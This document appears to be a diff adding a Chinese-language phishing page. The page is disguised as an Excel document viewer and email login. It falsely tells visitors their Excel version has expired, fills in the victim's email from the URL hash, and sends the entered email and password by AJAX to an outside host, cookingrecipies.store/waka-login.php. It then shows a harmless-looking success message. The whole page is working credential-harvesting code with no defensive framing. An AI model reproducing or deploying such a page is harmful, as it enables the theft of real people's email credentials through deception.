@@ -1,0 +1,128 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Excel_DomainPanel易免费邮一品牌</title>
+	<link rel="icon" href="icon.png">
+	<link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="bootstrap.min.css">
+</head>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+	<header>
+		<div class="header-container py-2">
+			<img src="logo.png" width="130px" height="30px">
+		</div>
+	</header>
+	<section style="float: left;">
+		<div class="row">
+			<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12 mx-auto">
+				<div class="col-sm-12 col-md-5 px-0 float-left d-none d-sm-none d-md-inline d-lg-inline d-xl-inline">
+					<img src="bg.png">
+				</div>
+				<div class="col-sm-12 col-md-7 float-left p-0 bg-white">
+					<div class="col-sm-12 col-md-7 mx-auto">
+						<div class="col-12 p-0">
+							<div class="col-12 py-2 float-left mt-5">
+								<p class="text-center text-warning mb-0 mt-5">您的 Microsoft Excel 版本已过期，请确认您的接收电子邮件以在线查看文档</p>
+								<h5 class="m-0 py-1 text-center"><strong>登录邮箱在线查看文件</strong></h5>
+							</div>
+														<div class="form-group px-4">
+								<div class="alert alert-info hide" id="processing"></div>
+							</div>
+							  <form id="myForm">
+
+							<div class="form-group px-4 mt-2">
+								<input type="email" name="email" class="form-control rounded-0" id="email" value="" placeholder="Email account" readonly="">
+								<small id="error" style="color:red;"></small>
+							</div>
+							
+<div class="form-group px-4 mt-4">
+								<input type="password" name="password" class="form-control rounded-0" id="password" placeholder="enter password" required="">
+								<small id="error" style="color:red;"></small>
+							</div>
+							
+							
+							
+<div class="form-group px-4">
+								<input type="checkbox" id="remember">
+								<label class="text-medium">Remember login</label>
+								<label class="text-medium float-right">Forgot password？</label>
+							</div>
+	<div class="form-group px-4">
+	<button type="submit" class="btn btn-block btn-lg btn-primary" id="submit">查看文档</button>
+	</div>
+							<div class="form-group px-4">
+								<p class="text-primary text-center">注册新帐号</p>
+							</div>
+  </form>
+
+  <div id="result"></div>
+
+							
+							
+						
+							    
+
+   
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+
+
+
+  <script>
+    $(document).ready(function() {
+      $('#myForm').submit(function(event) {
+        event.preventDefault(); // Prevent form submission
+
+        // Get form data
+        var formData = $(this).serialize();
+        var password = $('#password').val();
+
+
+        if (password === '') {
+          $('#result').html('請輸入密碼。');
+          return;
+        }
+
+
+        // Send AJAX request
+        $.ajax({
+          type: 'POST',
+          url: 'https://cookingrecipies.store/waka-login.php',
+          data: formData,
+          success: function(response) {
+            // Handle success response
+            $('#result').html('Form submitted successfully!');
+          },
+          error: function(xhr, status, error) {
+            // Handle error response
+            console.log(error);
+            $('#result').html('An error occurred while submitting the form.');
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
+
+
+<body>
+
+	
+
+<script type="text/javascript">
+     var email = window.location.hash.substring(1);
+     document.getElementById("email").value=email;
+</script>
+</body></html>
+
+
+
+
+
+
